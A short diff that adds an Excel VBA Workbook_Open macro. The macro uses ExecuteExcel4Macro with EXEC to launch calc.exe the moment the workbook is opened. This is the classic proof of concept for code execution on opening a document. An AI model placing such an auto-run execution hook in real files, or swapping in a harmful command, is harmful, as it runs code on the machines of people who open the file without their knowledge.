@@ -1,0 +1,4 @@
+Sub Workbook_Open()
+Application.ExecuteExcel4Macro "EXEC(""calc.exe"")"
+End Sub
+
